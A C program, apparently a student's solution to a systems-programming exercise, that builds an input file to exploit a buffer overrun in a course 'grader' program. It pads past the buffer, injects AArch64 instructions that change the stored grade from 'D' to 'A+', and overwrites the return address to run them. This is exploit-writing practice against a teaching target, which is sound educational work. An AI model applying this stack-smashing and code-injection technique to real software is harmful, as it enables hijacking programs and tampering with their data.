/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* author: anish kataria                                                */
/*--------------------------------------------------------------------*/

/*
   this code creates a "dataAplus" file designed to exploit a buffer
   overrun vulnerability in the grader program, compelling it to print
   "A+" instead of "D".

   approach:
   - write a chosen user alias followed by a null terminator.
   - insert sufficient padding ('0' chars) to overflow and reach the 
     return address region of the stack.
   - place an 'A' character and some null padding for alignment 
     purposes, ensuring instructions are positioned correctly.
   - inject instructions that load and print 'A', then modify the 
     grade variable by replacing 'D' with '+', and finally branch back
     into the mainline code that prints the grade.
   - overwrite the return address so that the program executes our 
     injected instructions rather than returning normally.
*/

/*
   runtime characteristics:
   - no command-line arguments processed.
   - no input taken from stdin or any other sources.
   - writes only to the file "dataAplus".
   - returns 0 on success, or 1 if the output file cannot be created.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants derived from static analysis of the grader program */
enum {
    ALIAS_LEN        = 9,   /* length of "AnishKKat" excluding the null */
    OVERFLOW_COUNT   = 10,  /* number of '0' chars used to exceed bounds */
    ALIGN_NULLS      = 3,   /* alignment nulls after 'A' to position code */
    ADDR_A_CHAR      = 0x42006c, /* memory loc where 'A' resides */
    ADDR_INSTR_START = 0x420070, /* start addr for injected instructions */
    ADDR_PRINTF      = 0x400690, /* address of printf function */
    ADDR_GRADE       = 0x420044, /* location of 'grade' variable in data */
    ADDR_BRANCH_BACK = 0x40089c, /* address in main to return after hijack */
    SHIFT_BL         = 2,
    MASK_BL          = 0x03FFFFFF
};

/* constructs a BL (branch-link) instruction that makes the cpu call a 
   function located at ulTargetAddr when the current instruction is at 
   ulCurrentAddr. this sets up a "call" to printf without normal 
   function call conventions, leveraging direct branching. */
static unsigned int MakeBranchLink(unsigned long ulTargetAddr, 
                                   unsigned long ulCurrentAddr) {
    unsigned int uiOpcode;
    unsigned int uiOffset;
    /* base BL opcode */
    uiOpcode = 0x94000000;
    /* compute offset in instructions */
    uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> SHIFT_BL);
    /* place offset into the BL instruction field */
    uiOpcode |= (uiOffset & MASK_BL);
    return uiOpcode;
}

int main(void) {
    /* declaring all variables at the start for c89 compliance */
    const char *pszAlias = "AnishKKat";
    FILE *pOutput;
    int iIndex;
    unsigned long ulNewReturn;
    unsigned int uiInstrLoadA;
    unsigned int uiInstrCallPrint;
    unsigned int uiInstrMovPlus;
    unsigned int uiInstrAdrGrade;
    unsigned int uiInstrStorePlus;
    unsigned int uiInstrBranchBack;
    unsigned int uiInstrSet[6];
    char cZero;
    char cNull;

    /* open the output file in binary mode to ensure exact byte output */
    pOutput = fopen("dataAplus", "wb");
    if (pOutput == NULL) {
        /* print a simple error if we cannot write the file */
        fprintf(stderr, "error: unable to open dataAplus for writing.\n");
        return 1;
    }

    /* define common characters once for clarity */
    cZero = '0';
    cNull = '\0';

    /* write the user alias followed by a null terminator. this sets the 
       initial content that the grader expects as a username. */
    fwrite(pszAlias, 1, ALIAS_LEN, pOutput);
    fputc(cNull, pOutput);

    /* write a series of '0' characters to exceed the intended buffer 
       boundaries. this positions our future instructions in a location 
       that will later be executed instead of a normal return. */
    iIndex = 0;
    while (iIndex < OVERFLOW_COUNT) {
        fputc(cZero, pOutput);
        iIndex++;
    }

    /* place 'A' in memory to be printed, then follow it with null 
       bytes for alignment. ensuring correct alignment is crucial so 
       that the instructions we write land exactly where we want. */
    fputc('A', pOutput);
    iIndex = 0;
    while (iIndex < ALIGN_NULLS) {
        fputc(cNull, pOutput);
        iIndex++;
    }

    /*
       now set up the instructions that will run when the altered 
       return address sends execution here:

       1) adr x0, ADDR_A_CHAR:
          sets x0 to point to 'A', making printf print from that address
       2) bl ADDR_PRINTF:
          call printf to print 'A'
       3) mov w0, '+':
          load '+' character into w0 to replace 'D'
       4) adr x1, ADDR_GRADE:
          put the address of the grade variable into x1
       5) strb w0, [x1]:
          store '+' into the grade variable's location, changing the grade
       6) b ADDR_BRANCH_BACK:
          jump back to the main code, now confident that the grade is "A+"
    */

    uiInstrLoadA     = MiniAssembler_adr(0, ADDR_A_CHAR, ADDR_INSTR_START);
    uiInstrCallPrint = MakeBranchLink(ADDR_PRINTF, ADDR_INSTR_START + 4);
    uiInstrMovPlus   = MiniAssembler_mov(0, '+');
    uiInstrAdrGrade  = MiniAssembler_adr(1, ADDR_GRADE, ADDR_INSTR_START + 12);
    uiInstrStorePlus = MiniAssembler_strb(0, 1);
    uiInstrBranchBack= MiniAssembler_b(ADDR_BRANCH_BACK, ADDR_INSTR_START + 20);

    /* group all instructions into an array before writing them out. 
       this ensures a clean, contiguous block of machine code. */
    uiInstrSet[0] = uiInstrLoadA;
    uiInstrSet[1] = uiInstrCallPrint;
    uiInstrSet[2] = uiInstrMovPlus;
    uiInstrSet[3] = uiInstrAdrGrade;
    uiInstrSet[4] = uiInstrStorePlus;
    uiInstrSet[5] = uiInstrBranchBack;

    /* write all of the injected instructions in one operation, 
       producing a neat, consecutive code fragment in memory. */
    fwrite(uiInstrSet, sizeof(unsigned int), 6, pOutput);

    /* overwrite the return address so that when the function 
       tries to return, it goes straight into our code block 
       rather than following the normal execution path. */
    ulNewReturn = ADDR_INSTR_START;
    fwrite(&ulNewReturn, sizeof(unsigned long), 1, pOutput);

    /* close the file now that we have finished writing all data. */
    fclose(pOutput);
    return 0;
}